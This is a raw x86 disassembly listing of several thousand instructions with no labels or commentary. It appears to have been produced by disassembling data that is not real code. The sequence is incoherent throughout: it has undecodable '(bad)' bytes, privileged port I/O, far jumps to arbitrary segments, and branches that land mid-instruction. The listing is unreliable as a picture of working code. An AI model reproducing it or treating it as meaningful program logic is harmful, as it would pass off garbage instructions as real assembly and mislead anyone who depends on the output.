  4218d6:	xchg   edi,eax
  4218d7:	cmp    eax,0xbf0827b7
  4218dc:	dec    ebp
  4218dd:	pop    esp
  4218de:	push   cs
  4218df:	out    0x44,al
  4218e1:	add    edx,esi
  4218e3:	cli    
  4218e4:	fldcw  WORD PTR [edi-0x21]
  4218e7:	je     0x42195e
  4218e9:	xchg   ebx,eax
  4218ea:	fist   DWORD PTR [ebp+0x6cb944e5]
  4218f0:	and    BYTE PTR [ecx-0x3c],ch
  4218f3:	push   esi
  4218f4:	ja     0x421886
  4218f6:	push   eax
  4218f7:	xchg   ebp,eax
  4218f8:	jae    0x421894
  4218fa:	fwait
  4218fb:	in     al,dx
  4218fc:	rcr    DWORD PTR [edi-0x74],1
  4218ff:	outs   dx,BYTE PTR ds:[esi]
  421900:	pop    eax
  421901:	jno    0x421903
  421903:	push   edi
  421904:	jnp    0x42188e
  421906:	mov    esi,0xb0e4d8e4
  42190b:	sub    eax,0xe7f0b095
  421910:	shl    ebx,1
  421912:	sbb    BYTE PTR [eax+0x2bf8c91a],bl
  421918:	dec    edi
  421919:	jnp    0x421921
  42191b:	out    dx,al
  42191c:	rcr    BYTE PTR [esi-0x39d996b5],cl
  421922:	push   0x8
  421924:	sub    BYTE PTR [edx-0x498ffa66],ah
  42192a:	mov    cl,0x4
  42192c:	xor    bh,dl
  42192e:	test   BYTE PTR [ecx+0x45],0xe4
  421932:	push   ebp
  421933:	jmp    0xa01a9202
  421938:	shr    cl,cl
  42193a:	popf   
  42193b:	js     0x42190c
  42193d:	pop    ss
  42193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42193f:	aaa    
  421940:	and    al,0x6e
  421942:	adc    BYTE PTR [edi+0x68ba2f9],ah
  421948:	cmovle ecx,DWORD PTR [eax]
  42194b:	in     eax,dx
  42194c:	pop    bx
  42194e:	pop    eax
  42194f:	hlt    
  421950:	inc    edx
  421951:	cmp    esp,ebp
  421953:	dec    ebx
  421954:	int3   
  421955:	adc    al,0x32
  421957:	push   ss
  421958:	cmp    DWORD PTR [esi+0x3f],0xfffffff1
  42195c:	jne    0x4218e8
  42195e:	push   ebx
  42195f:	jmp    0x42192a
  421961:	xor    eax,0x7916e8d4
  421966:	jne    0x4219ca
  421968:	sbb    bl,BYTE PTR [esi-0x5b]
  42196b:	mov    ebp,0xfc31e64
  421970:	(bad)  
  421971:	inc    eax
  421972:	repz pop edx
  421974:	dec    edi
  421975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421976:	sub    BYTE PTR [esi],0xf5
  421979:	cmp    al,0x6a
  42197b:	mov    eax,ds:0x94b69444
  421980:	pop    ecx
  421981:	jae    0x421940
  421983:	out    0x45,al
  421985:	and    ah,BYTE PTR [eax-0x12]
  421988:	dec    edx
  421989:	add    edi,eax
  42198b:	adc    BYTE PTR ss:[edx],bh
  42198e:	sar    BYTE PTR [eax-0x78],1
  421991:	cmp    BYTE PTR [edx-0x35],bl
  421994:	out    0xa0,al
  421996:	retf   
  421997:	fmul   st(2),st
  421999:	jns    0x42194c
  42199b:	ja     0x421a01
  42199d:	cdq    
  42199e:	sbb    ebp,DWORD PTR [ecx]
  4219a0:	cwde   
  4219a1:	jno    0x421954
  4219a3:	pop    ecx
  4219a4:	inc    edx
  4219a5:	ror    DWORD PTR [ecx],1
  4219a7:	push   ecx
  4219a8:	adc    bl,BYTE PTR [ebx]
  4219aa:	jb     0x421932
  4219ac:	fistp  WORD PTR [esi]
  4219ae:	mov    ch,0xfc
  4219b0:	mov    DWORD PTR [ebp-0x13],edi
  4219b3:	sub    BYTE PTR [edx+edx*4+0x1a3948fd],al
  4219ba:	push   eax
  4219bb:	bnd jl 0x421a0b
  4219be:	or     esp,ebp
  4219c0:	mov    eax,ds:0x4054b4ae
  4219c5:	or     BYTE PTR [edi+eiz*8],cl
  4219c8:	push   esi
  4219c9:	jp     0x421a1d
  4219cb:	(bad)  
  4219cc:	sub    eax,0x3c906747
  4219d1:	and    DWORD PTR [edx],edi
  4219d3:	xor    dl,BYTE PTR [edi]
  4219d5:	mov    ecx,0x928aa387
  4219da:	add    DWORD PTR [ebp-0x782463eb],edi
  4219e0:	lods   al,BYTE PTR ds:[esi]
  4219e1:	ds adc eax,0x5118eb65
  4219e7:	mov    al,ds:0x44cd706d
  4219ec:	mov    edi,0xb3fb9c55
  4219f1:	lahf   
  4219f2:	cmp    esp,DWORD PTR [edx]
  4219f4:	test   BYTE PTR [ecx],ch
  4219f6:	outs   dx,BYTE PTR ds:[esi]
  4219f7:	push   ebx
  4219f8:	xor    ah,dl
  4219fa:	imul   ebx,eax,0xffffffb6
  4219fd:	fnsave [edi-0x104168ec]
  421a03:	pop    esi
  421a04:	xchg   DWORD PTR [ecx],ebx
  421a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a07:	mov    dh,0x3d
  421a09:	adc    cl,BYTE PTR [eax+0x6b8c55fb]
  421a0f:	lods   al,BYTE PTR ds:[esi]
  421a10:	je     0x4219ea
  421a12:	mov    ebx,0xb3bf84bc
  421a17:	je     0x421a91
  421a19:	call   0x17a81836
  421a1e:	imul   esi,eax,0x4390f58e
  421a24:	loope  0x4219bd
  421a26:	jecxz  0x421a8d
  421a28:	pop    ebx
  421a29:	dec    esp
  421a2a:	into   
  421a2b:	adc    al,0x79
  421a2d:	std    
  421a2e:	(bad)  
  421a2f:	and    dl,BYTE PTR [ebx]
  421a31:	bound  esp,QWORD PTR [ebx+0x6bd36fe8]
  421a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a38:	cmc    
  421a39:	or     eax,0x2561fcc6
  421a3e:	andps  xmm2,XMMWORD PTR [ebp+0x6b]
  421a42:	mov    esi,0x8edd9ef0
  421a47:	into   
  421a48:	adc    al,0xbc
  421a4a:	retf   
  421a4b:	inc    bl
  421a4d:	(bad)  
  421a4e:	int3   
  421a4f:	lds    esp,FWORD PTR [ebx]
  421a51:	retf   
  421a52:	jl     0x421a4b
  421a54:	add    esi,0xe05fa275
  421a5a:	mov    ch,0x24
  421a5c:	fdiv   DWORD PTR [ebx-0x14]
  421a5f:	test   cl,bh
  421a61:	stos   DWORD PTR es:[edi],eax
  421a62:	mov    dh,0x77
  421a64:	pop    edi
  421a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a66:	sub    ebp,esi
  421a68:	and    ah,cl
  421a6a:	mov    al,0xc9
  421a6c:	push   ss
  421a6d:	jns    0x421a0b
  421a6f:	xchg   esi,eax
  421a70:	jns    0x421a47
  421a72:	and    DWORD PTR [eax+esi*2],0x12
  421a76:	pop    esp
  421a77:	(bad)  
  421a78:	rcr    ah,1
  421a7a:	jne    0x421a4c
  421a7c:	mov    dh,0xca
  421a7e:	mov    dl,0xf3
  421a80:	push   ss
  421a81:	stc    
  421a82:	push   0xffffff90
  421a84:	out    0x18,al
  421a86:	mov    edx,0xab2711f0
  421a8b:	cmp    eax,0xad1befeb
  421a90:	daa    
  421a91:	(bad)  
  421a92:	mov    ebx,0x6a7a46a4
  421a97:	aam    0xf2
  421a99:	xor    al,0xce
  421a9b:	repz sbb al,0x52
  421a9e:	mov    bl,0x4
  421aa0:	out    dx,ax
  421aa2:	neg    DWORD PTR [ebx-0x5a]
  421aa5:	into   
  421aa6:	out    0x6,eax
  421aa8:	loopne 0x421a49
  421aaa:	sahf   
  421aab:	push   ds
  421aac:	test   al,0x3
  421aae:	mov    dl,0x70
  421ab0:	push   edi
  421ab1:	jp     0x421a6e
  421ab3:	inc    edi
  421ab4:	pop    ebx
  421ab5:	test   al,0xeb
  421ab7:	out    dx,eax
  421ab8:	rol    BYTE PTR [edi+edi*8+0x14],cl
  421abc:	cli    
  421abd:	sbb    eax,0xef6b501c
  421ac2:	cmp    eax,0x7b9aaf36
  421ac7:	pop    ecx
  421ac8:	jl     0x421b2f
  421aca:	push   ecx
  421acb:	pop    ds
  421acc:	mov    WORD PTR [eax],cs
  421ace:	gs jbe 0x421b2f
  421ad1:	cli    
  421ad2:	out    dx,eax
  421ad3:	les    ebp,FWORD PTR ds:0x61d5a5a2
  421ad9:	xchg   ch,cl
  421adb:	rcl    esi,0x9b
  421ade:	pop    ss
  421adf:	jge    0x421a72
  421ae1:	dec    esi
  421ae2:	mov    WORD PTR [edx+0x18],gs
  421ae5:	mov    DWORD PTR [eax-0x269fe5e7],esi
  421aeb:	js     0x421b31
  421aed:	pop    edx
  421aee:	and    esi,DWORD PTR [ecx]
  421af0:	xchg   ebp,eax
  421af1:	sub    bh,BYTE PTR [esi]
  421af3:	in     eax,dx
  421af4:	and    al,0x16
  421af6:	xor    DWORD PTR [esi-0x1091a352],0x47
  421afd:	pop    ebp
  421afe:	test   esp,eax
  421b00:	je     0x421af7
  421b02:	mov    cl,0x70
  421b04:	jns    0x421aac
  421b06:	cmp    ecx,esp
  421b08:	in     eax,0x16
  421b0a:	or     ecx,DWORD PTR [edx+0x1f]
  421b0d:	push   es
  421b0e:	ss repnz mov esp,0x4594b78c
  421b15:	pop    edi
  421b16:	xor    BYTE PTR ds:0xe5d30d55,bh
  421b1c:	and    bl,BYTE PTR [esi]
  421b1e:	sbb    BYTE PTR [ebp+0x1d],bl
  421b21:	sub    DWORD PTR [esi-0x3065ff52],esi
  421b27:	cwde   
  421b28:	call   FWORD PTR [edx+0x41bb236b]
  421b2e:	ret    0x7b62
  421b31:	xchg   esp,eax
  421b32:	sub    DWORD PTR [edi+ebx*4-0x6fb7a463],esi
  421b39:	sbb    eax,0xe3dc115e
  421b3e:	fnstcw WORD PTR [ecx-0x34a7345a]
  421b44:	and    DWORD PTR [ebx+0x16ce1969],esi
  421b4a:	or     BYTE PTR [ebp+eax*2-0x522403f8],dl
  421b51:	cdq    
  421b52:	mov    edi,0xf5cc4d44
  421b57:	inc    eax
  421b58:	and    al,0x41
  421b5a:	inc    ebp
  421b5b:	or     BYTE PTR [ecx+0x2db975ef],0xe9
  421b62:	mov    al,ah
  421b64:	fcmovnb st,st(1)
  421b66:	jae    0x421bb9
  421b68:	pop    esp
  421b69:	push   0xaef52017
  421b6e:	or     esi,edx
  421b70:	das    
  421b71:	test   DWORD PTR [ebx-0x5a],edx
  421b74:	sbb    DWORD PTR [ecx],edi
  421b76:	add    BYTE PTR [eax-0x2174599],bl
  421b7c:	mov    edx,0x6e68cb9f
  421b81:	loope  0x421bbe
  421b83:	push   0x38
  421b85:	mov    ecx,0x7ceb1d7d
  421b8a:	mov    eax,0x82ebc734
  421b8f:	jno    0x421b8a
  421b91:	inc    edx
  421b92:	sbb    dl,BYTE PTR [edx]
  421b94:	xchg   esp,eax
  421b95:	into   
  421b96:	jno    0x421bff
  421b98:	and    al,0x21
  421b9a:	inc    edx
  421b9b:	mov    dh,0x5a
  421b9d:	lahf   
  421b9e:	imul   ebx,DWORD PTR [ecx],0x11
  421ba1:	xor    BYTE PTR [eax+eax*4],dl
  421ba4:	sub    DWORD PTR [ebp+0x1],ebp
  421ba7:	cmp    edx,DWORD PTR [esi+eiz*4-0x29320aa0]
  421bae:	mov    bh,al
  421bb0:	pop    ss
  421bb1:	or     eax,0x8fa757d5
  421bb6:	mov    WORD PTR [ebx+0x60],?
  421bb9:	mov    DWORD PTR [ebp-0x4b4e29ce],ecx
  421bbf:	rcl    BYTE PTR [esi],0x59
  421bc2:	pop    ds
  421bc3:	push   eax
  421bc4:	xor    BYTE PTR [edx+0x11],ch
  421bc7:	inc    esi
  421bc8:	jmp    0x3438:0x9bfe4c7c
  421bcf:	xchg   ecx,eax
  421bd0:	or     esi,DWORD PTR [edx-0x26e39f49]
  421bd6:	je     0x421c1c
  421bd8:	int3   
  421bd9:	inc    esp
  421bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bdb:	mov    WORD PTR [ebx],ss
  421bdd:	scas   eax,DWORD PTR es:[edi]
  421bde:	jb     0x421b9d
  421be0:	and    eax,0xb9eeda16
  421be5:	(bad)  
  421be6:	aam    0x1c
  421be8:	dec    ecx
  421be9:	sbb    eax,esi
  421beb:	out    0xd6,eax
  421bed:	add    eax,0x9f0e9f17
  421bf2:	ret    
  421bf3:	pop    edx
  421bf4:	cwde   
  421bf5:	sbb    eax,edi
  421bf7:	and    eax,0xef4c06e5
  421bfc:	push   edx
  421bfd:	add    edx,edi
  421bff:	mov    bh,0x24
  421c01:	fadd   DWORD PTR [ecx]
  421c03:	or     eax,eax
  421c05:	fdiv   DWORD PTR [eax-0x120aa94c]
  421c0b:	jge    0x421c02
  421c0d:	inc    eax
  421c0e:	mov    ebp,0xe377caed
  421c13:	add    ebx,DWORD PTR ds:0xdd12cfb9
  421c19:	ret    
  421c1a:	popa   
  421c1b:	sub    edx,DWORD PTR [esi-0x5c11e465]
  421c21:	adc    ecx,DWORD PTR [ecx-0x73f92785]
  421c27:	pop    edi
  421c28:	in     al,dx
  421c29:	mov    dh,0xb0
  421c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c2c:	mov    DWORD PTR [ecx-0x29],ebx
  421c2f:	mov    fs,WORD PTR [edi]
  421c31:	loope  0x421c64
  421c33:	shl    eax,0xac
  421c36:	mov    edx,eax
  421c38:	iret   
  421c39:	push   esp
  421c3a:	in     eax,dx
  421c3b:	pop    ebp
  421c3c:	add    ch,cl
  421c3e:	jne    0x421cab
  421c40:	and    eax,0xd754b5ec
  421c45:	pop    esi
  421c46:	jp     0x421bf0
  421c48:	or     DWORD PTR [edi-0x1ff34eef],eax
  421c4e:	mov    edx,0x5aa03d4c
  421c53:	pop    esp
  421c54:	and    ecx,DWORD PTR [esi-0x4a]
  421c57:	je     0x421c7c
  421c59:	mov    edi,0xa0d44500
  421c5e:	stos   DWORD PTR es:[edi],eax
  421c5f:	push   0xe286e365
  421c64:	dec    edx
  421c65:	(bad)  
  421c66:	or     bh,BYTE PTR [ebp-0x65]
  421c69:	in     al,dx
  421c6a:	(bad)  
  421c6b:	int3   
  421c6c:	and    eax,0xec985b29
  421c71:	and    cl,BYTE PTR [ecx]
  421c73:	leave  
  421c74:	out    dx,eax
  421c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c76:	imul   ecx,DWORD PTR [esi+0x41a4a8a4],0xffffffee
  421c7d:	cmp    al,0xc1
  421c7f:	ins    BYTE PTR es:[edi],dx
  421c80:	aas    
  421c81:	xchg   esp,eax
  421c82:	push   esp
  421c83:	cmp    BYTE PTR [eax-0x64],bh
  421c86:	dec    ebp
  421c87:	jg     0x421c8c
  421c89:	ins    DWORD PTR es:[edi],dx
  421c8a:	call   0x72d674dc
  421c8f:	cs mov dh,0x63
  421c92:	aaa    
  421c93:	fs dec edx
  421c95:	and    eax,0xb91aef20
  421c9a:	scas   al,BYTE PTR es:[edi]
  421c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c9c:	jb     0x421cc1
  421c9e:	popf   
  421c9f:	or     DWORD PTR [edi-0x79],edx
  421ca2:	int    0x60
  421ca4:	mov    bl,0x88
  421ca6:	cld    
  421ca7:	inc    esp
  421ca8:	rcr    DWORD PTR es:[eax],cl
  421cab:	fcmovne st,st(7)
  421cad:	mov    ds:0x59adf97a,al
  421cb2:	out    dx,al
  421cb3:	fadd   QWORD PTR [eax+eiz*4]
  421cb6:	repz lds esi,FWORD PTR [eax+0x75b1fbd5]
  421cbd:	ja     0x421c69
  421cbf:	call   0x9d794c75
  421cc4:	push   ds
  421cc5:	sbb    DWORD PTR [ebx-0x34bce666],ebp
  421ccb:	mov    bh,dl
  421ccd:	test   al,0xfb
  421ccf:	add    al,0xf7
  421cd1:	in     eax,dx
  421cd2:	and    DWORD PTR [edi-0x248aaa8d],ebp
  421cd8:	aad    0x73
  421cda:	jecxz  0x421c8f
  421cdc:	test   al,0x23
  421cde:	sahf   
  421cdf:	(bad)  
  421ce0:	pop    ebx
  421ce1:	loopne 0x421d0c
  421ce3:	or     DWORD PTR [edi+ebx*1-0x4c],eax
  421ce7:	scas   al,BYTE PTR es:[edi]
  421ce8:	push   ebp
  421ce9:	and    eax,DWORD PTR [edx-0x1510a913]
  421cef:	push   cs
  421cf0:	push   ds
  421cf1:	cdq    
  421cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cf3:	cwde   
  421cf4:	fcmove st,st(6)
  421cf6:	bound  edx,QWORD PTR [edi-0xa]
  421cf9:	fwait
  421cfa:	sbb    ecx,ecx
  421cfc:	ds push cs
  421cfe:	(bad)  
  421cff:	mov    ebx,0x8c65b3d5
  421d04:	cmp    eax,0x9f24b04b
  421d09:	and    al,0xfe
  421d0b:	fsubr  QWORD PTR [ebp-0x34bb845d]
  421d11:	fcom   DWORD PTR [ecx]
  421d13:	xor    BYTE PTR [ebx+0xa],bh
  421d16:	lods   al,BYTE PTR ds:[esi]
  421d17:	aad    0xa2
  421d19:	jb     0x421cd1
  421d1b:	adc    al,0x39
  421d1d:	fmulp  st(7),st
  421d1f:	rcl    DWORD PTR ds:0x5df47696,0xec
  421d26:	fsubr  QWORD PTR [ebp+ebx*1-0x77]
  421d2a:	ins    BYTE PTR es:[edi],dx
  421d2b:	mov    eax,ds:0x7c196a3e
  421d30:	retf   
  421d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d32:	jnp    0x421d5e
  421d34:	mov    ch,0x8d
  421d36:	daa    
  421d37:	aad    0xd9
  421d39:	nop
  421d3a:	pop    ecx
  421d3b:	fistp  WORD PTR ds:0x36d595fb
  421d41:	pop    ebx
  421d42:	xchg   DWORD PTR [ecx],ebx
  421d44:	push   ds
  421d45:	and    al,0x27
  421d47:	ins    DWORD PTR es:[edi],dx
  421d48:	(bad)  
  421d49:	popa   
  421d4a:	cli    
  421d4b:	stos   DWORD PTR es:[edi],eax
  421d4c:	and    eax,0x8bf498c2
  421d51:	adc    al,0xbc
  421d53:	repz inc edx
  421d55:	retf   0xb36a
  421d58:	repnz in al,dx
  421d5a:	mov    esi,0xc5fda9b4
  421d5f:	dec    edx
  421d60:	inc    ebp
  421d61:	retf   
  421d62:	(bad)  
  421d63:	in     al,0x88
  421d65:	mov    dl,bl
  421d67:	shr    BYTE PTR [ebp+0x50fb1f19],0xa3
  421d6e:	or     ebp,DWORD PTR [edx]
  421d70:	inc    eax
  421d71:	inc    bx
  421d73:	mov    ?,WORD PTR ds:0x28f26453
  421d79:	adc    BYTE PTR [edi-0x2a],dl
  421d7c:	aad    0xac
  421d7e:	call   0x695b8382
  421d83:	out    dx,al
  421d84:	mov    eax,0x757e47b5
  421d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d8a:	int3   
  421d8b:	out    dx,al
  421d8c:	sahf   
  421d8d:	fnstcw WORD PTR [eax+0x19]
  421d90:	loopne 0x421dc9
  421d92:	mov    edx,0xbfe3ef09
  421d97:	test   BYTE PTR ds:0xc562133f,al
  421d9d:	addr16 or bl,ch
  421da0:	dec    eax
  421da1:	iret   
  421da2:	xor    al,0xd3
  421da4:	or     ch,BYTE PTR [edx-0x62a9bbf4]
  421daa:	push   ecx
  421dab:	daa    
  421dac:	lods   al,BYTE PTR ds:[si]
  421dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421daf:	bound  edx,QWORD PTR [esi]
  421db1:	aad    0xc8
  421db3:	rcr    BYTE PTR ds:0xdb6efe75,cl
  421db9:	mov    gs,WORD PTR [edx+0xc]
  421dbc:	push   ds
  421dbd:	xchg   ebx,eax
  421dbe:	jmp    0x421e24
  421dc0:	jne    0x421d66
  421dc2:	leave  
  421dc3:	sub    esi,esp
  421dc5:	pushf  
  421dc6:	mov    ebx,0x5bec10cc
  421dcb:	dec    ebx
  421dcc:	fstp   DWORD PTR [ecx+0x55f78df4]
  421dd2:	sub    edx,DWORD PTR [ebp-0xe8a9ce9]
  421dd8:	jnp    0x421d77
  421dda:	jnp    0x421df2
  421ddc:	(bad)
  421ddf:	lods   eax,DWORD PTR ds:[esi]
  421de0:	inc    esp
  421de1:	dec    ebp
  421de2:	mov    ah,al
  421de4:	aad    0x6a
  421de6:	mov    edx,0x1f4c92d4
  421deb:	bswap  edx
  421ded:	and    al,0xe7
  421def:	leave  
  421df0:	test   DWORD PTR [edi-0x20],esi
  421df3:	icebp  
  421df4:	stc    
  421df5:	mov    ch,BYTE PTR [ebx+0x7b01b5d7]
  421dfb:	lock aad 0x2b
  421dfe:	dec    edx
  421dff:	mov    ebx,0xd2bff918
  421e04:	mov    ebx,0x4af3c7ab
  421e09:	nop
  421e0a:	cld    
  421e0b:	aaa    
  421e0c:	mov    al,0x2f
  421e0e:	sub    esi,DWORD PTR [edx]
  421e10:	sar    BYTE PTR [ebx-0x37ba8d4a],1
  421e16:	dec    edx
  421e17:	and    eax,0x74b19002
  421e1c:	leave  
  421e1d:	in     eax,dx
  421e1e:	int    0xca
  421e20:	mul    BYTE PTR [ebx-0x16]
  421e23:	pop    edx
  421e24:	ficomp DWORD PTR [ebp-0x75f6fdbc]
  421e2a:	mov    BYTE PTR [eax],dh
  421e2c:	sub    DWORD PTR [edx-0x16de13a2],0xc72d5002
  421e36:	mov    DWORD PTR [edx],eax
  421e38:	int    0x99
  421e3a:	jmp    0x421df7
  421e3c:	lock jne 0x421e5a
  421e3f:	repnz mov bh,0xf8
  421e42:	stc    
  421e43:	cmp    eax,0x24b89022
  421e48:	pop    eax
  421e49:	jbe    0x421e8d
  421e4b:	pop    ebp
  421e4c:	(bad)  
  421e4d:	pop    edi
  421e4e:	retf   0x2081
  421e51:	add    DWORD PTR [ecx-0x77],0x65492134
  421e58:	jns    0x421e62
  421e5a:	sub    ecx,esp
  421e5c:	push   ecx
  421e5d:	jae    0x421e14
  421e5f:	mov    ah,0xd4
  421e61:	jb     0x421ea7
  421e63:	(bad)  
  421e64:	mov    bh,0xc9
  421e66:	shl    BYTE PTR [esi-0x1456158f],cl
  421e6c:	push   esi
  421e6d:	or     al,0x77
  421e6f:	xchg   esi,eax
  421e70:	and    eax,0x5c0479a9
  421e75:	xchg   edi,eax
  421e76:	and    DWORD PTR [esi],ebp
  421e78:	jmp    0x356:0x95518a5d
  421e7f:	out    0x9d,eax
  421e81:	rcl    DWORD PTR [edx-0x7e],1
  421e84:	sbb    DWORD PTR [ecx+0x22607a3a],edi
  421e8a:	push   edx
  421e8b:	push   0x27
  421e8d:	inc    ebx
  421e8e:	out    dx,eax
  421e8f:	push   0xf59d11d
  421e94:	xchg   edx,eax
  421e95:	push   cs
  421e96:	std    
  421e97:	scas   al,BYTE PTR es:[edi]
  421e98:	bound  ebp,QWORD PTR [ebx-0x36b31fbd]
  421e9e:	dec    ebp
  421e9f:	and    cl,dl
  421ea1:	fwait
  421ea2:	mov    dh,0xc0
  421ea4:	mov    ecx,0x2bd78ba8
  421ea9:	xor    dh,BYTE PTR [ecx+eax*8+0x643cbb1d]
  421eb0:	fcomi  st,st(7)
  421eb2:	mov    cl,0x44
  421eb4:	lock cmp esp,DWORD PTR [eax+0x2a395cb]
  421ebb:	in     eax,dx
  421ebc:	aam    0x9b
  421ebe:	dec    edx
  421ebf:	mov    eax,0x49a15978
  421ec4:	mov    cl,0x85
  421ec6:	(bad)
  421eca:	stc    
  421ecb:	pop    ebx
  421ecc:	sub    eax,0xf1d1e9c
  421ed1:	hlt    
  421ed2:	xlat   BYTE PTR ds:[ebx]
  421ed3:	icebp  
  421ed4:	push   edi
  421ed5:	je     0x421e92
  421ed7:	xor    al,0xcc
  421ed9:	cwde   
  421eda:	mov    al,ds:0xe15b3540
  421edf:	in     eax,0x7a
  421ee1:	pop    esi
  421ee2:	or     ebp,DWORD PTR ds:[ecx+ebp*4-0x6d]
  421ee7:	sbb    al,0x54
  421ee9:	pop    es
  421eea:	push   esi
  421eeb:	add    al,0xbc
  421eed:	and    eax,0x9b7880eb
  421ef2:	dec    ebx
  421ef3:	fs adc ah,bl
  421ef6:	jb     0x421f06
  421ef8:	jmp    0x421eb4
  421efa:	fwait
  421efb:	mov    al,ds:0xb692131a
  421f00:	sbb    cl,BYTE PTR [edi-0x44]
  421f03:	jl     0x421f51
  421f05:	sbb    eax,0x3bd65113
  421f0a:	rcr    DWORD PTR [ecx+ecx*4-0x58],0xac
  421f0f:	mov    ah,BYTE PTR [edi]
  421f11:	sub    DWORD PTR [edx+0x79],esi
  421f14:	loopne 0x421ed5
  421f16:	mov    dl,0xd4
  421f18:	sub    eax,ebx
  421f1a:	mov    ds:0xbeaaf672,al
  421f1f:	xor    eax,0x52940f8e
  421f24:	mov    dl,0xa5
  421f26:	(bad)
  421f2c:	imul   edi,esp,0xffffffbc
  421f2f:	xor    al,0xe0
  421f31:	jae    0x421eb8
  421f33:	xchg   ebx,eax
  421f34:	cmc    
  421f35:	das    
  421f36:	adc    ch,ch
  421f38:	hlt    
  421f39:	mov    ecx,0x7a002c0f
  421f3e:	pop    edi
  421f3f:	xor    DWORD PTR [ebx-0x66],eax
  421f42:	rcl    DWORD PTR [eax],1
  421f44:	jbe    0x421f1c
  421f46:	(bad)  
  421f47:	in     eax,dx
  421f48:	daa    
  421f49:	add    DWORD PTR [edx],0x605669a6
  421f4f:	repz int3 
  421f51:	sub    ebx,edi
  421f53:	out    0x84,al
  421f55:	jmp    0xd6dea413
  421f5a:	repnz sbb al,0x57
  421f5d:	add    BYTE PTR [esi+0x1a1c05b2],cl
  421f63:	jmp    0x913318c5
  421f68:	adc    al,0x2e
  421f6a:	mov    bl,0x4
  421f6c:	jno    0x421f11
  421f6e:	cs ret 
  421f70:	mov    ch,0xab
  421f72:	aam    0xed
  421f74:	je     0x421fba
  421f76:	mov    dl,0x4a
  421f78:	pop    es
  421f79:	cmp    bh,BYTE PTR [ebx+eiz*8-0x1a0262d1]
  421f80:	lea    eax,[ecx-0x78]
  421f83:	xor    al,0x15
  421f85:	xor    al,0xf0
  421f87:	in     al,dx
  421f88:	lods   eax,DWORD PTR ds:[esi]
  421f89:	call   0x69620dd7
  421f8e:	pop    edi
  421f8f:	ret    
  421f90:	sahf   
  421f91:	retf   
  421f92:	add    ebp,esp
  421f94:	pop    es
  421f95:	fwait
  421f96:	sub    esi,DWORD PTR [edi+0xabf41ef]
  421f9c:	cmp    DWORD PTR [esi],eax
  421f9e:	pop    edi
  421f9f:	pop    esi
  421fa0:	retw   
  421fa2:	mov    esp,0xfa9e1bd4
  421fa7:	xor    edx,esp
  421fa9:	(bad)  
  421faa:	sbb    ecx,ebx
  421fac:	pop    ebp
  421fad:	fwait
  421fae:	pop    ecx
  421faf:	fldcw  WORD PTR [esi]
  421fb1:	push   ss
  421fb2:	jmp    0xe46b:0xce7cc5b7
  421fb9:	mov    ds:0x4524b5,al
  421fbe:	and    eax,0xac2d2538
  421fc3:	in     eax,dx
  421fc4:	pop    es
  421fc5:	dec    esp
  421fc6:	push   esp
  421fc7:	jmp    0xa2bfe8e9
  421fcc:	int3   
  421fcd:	mov    dl,BYTE PTR ds:[eax+eax*2+0x545ceba8]
  421fd5:	cmp    al,BYTE PTR [ecx+0x3b]
  421fd8:	shl    BYTE PTR [edx-0x2461697a],0xb9
  421fdf:	test   BYTE PTR [ebp-0x42],bl
  421fe2:	mov    DWORD PTR [ebx+0x693ec77],eax
  421fe8:	aad    0x1e
  421fea:	mov    dl,dh
  421fec:	fs mov ah,0xb4
  421fef:	inc    ecx
  421ff0:	jp     0x42201b
  421ff2:	jle    0x421fa8
  421ff4:	and    al,0xf5
  421ff6:	push   ds
  421ff7:	sub    eax,0xe815c345
  421ffc:	push   ebp
  421ffd:	lahf   
  421ffe:	mov    eax,ds:0x60891c36
  422003:	(bad)  
  422004:	scas   al,BYTE PTR es:[edi]
  422005:	xor    al,0xf9
  422007:	sbb    esi,DWORD PTR [edx+0x13]
  42200a:	mov    bl,0xe7
  42200c:	and    eax,0x2e80f79
  422011:	loope  0x422027
  422013:	push   ebx
  422014:	and    eax,0x2f2bed39
  422019:	adc    dl,BYTE PTR ds:0xd9a50906
  42201f:	mov    eax,0xe94d1fe5
  422024:	scas   eax,DWORD PTR es:[edi]
  422025:	xchg   esp,eax
  422026:	mov    ah,0xa1
  422028:	and    bl,cl
  42202a:	jmp    0x9e57e697
  42202f:	dec    esp
  422030:	adc    edx,DWORD PTR [esi+0x7dc3e6dc]
  422036:	push   ecx
  422037:	ins    BYTE PTR es:[edi],dx
  422038:	cmp    BYTE PTR [esi-0x35],ch
  42203b:	out    0xb4,al
  42203d:	pop    ebp
  42203e:	dec    ebx
  42203f:	cli    
  422040:	pop    ss
  422041:	cdq    
  422042:	inc    eax
  422043:	inc    edx
  422044:	std    
  422045:	fcmovne st,st(4)
  422047:	sub    eax,0xbb6d05cc
  42204c:	sbb    al,0x9d
  42204e:	dec    ebx
  42204f:	sbb    DWORD PTR [edi+0x1c9bc62f],0xffffffd9
  422056:	lea    esp,[eax-0x31]
  422059:	xchg   BYTE PTR [edi+0x4d],al
  42205c:	dec    edx
  42205d:	retf   0x543b
  422060:	sbb    ch,BYTE PTR [edx]
  422062:	jp     0x4220dc
  422064:	ins    BYTE PTR es:[edi],dx
  422065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422066:	pop    ss
  422067:	cmp    dh,dl
  422069:	repnz pop ebp
  42206b:	sti    
  42206c:	xchg   ecx,eax
  42206d:	or     DWORD PTR [ecx],edx
  42206f:	and    al,0x11
  422071:	pop    esi
  422072:	push   edx
  422073:	jmp    0x42201d
  422075:	shl    BYTE PTR [eax+0x6e3e0103],1
  42207b:	hlt    
  42207c:	jmp    0x4220a9
  42207e:	popf   
  42207f:	ror    BYTE PTR [esi-0x75058462],1
  422085:	mul    BYTE PTR [edx+0x4ba20033]
  42208b:	pop    edi
  42208c:	dec    ebx
  42208d:	not    DWORD PTR es:[edx]
